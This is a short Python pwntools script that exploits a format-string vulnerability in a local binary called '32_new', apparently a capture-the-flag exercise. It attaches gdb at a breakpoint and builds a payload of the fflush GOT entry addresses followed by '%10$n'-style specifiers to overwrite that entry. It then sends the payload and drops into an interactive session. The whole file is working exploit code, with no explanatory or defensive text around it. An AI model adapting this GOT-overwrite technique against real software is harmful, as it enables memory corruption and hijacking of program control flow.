from pwn import *

target = process("./32_new")
context.terminal = ('xfce4-terminal', '-e')
gdb.attach(target, gdbscript='b *0x080487dc')    #0x80487dc is address of an instruction right after the call to printf in main()
# gdb.attach(target)
print(target.recvline())

fflush_adr0 = "\x28\xa0\x04\x08"
fflush_adr1 = "\x29\xa0\x04\x08"
fflush_adr2 = "\x2b\xa0\x04\x08"

fmt_string0 = "%10$n"
fmt_string1 = "%11$n"
fmt_string2 = "%12$n"

payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fmt_string0 + fmt_string1 + fmt_string2
target.sendline(payload)
target.interactive()
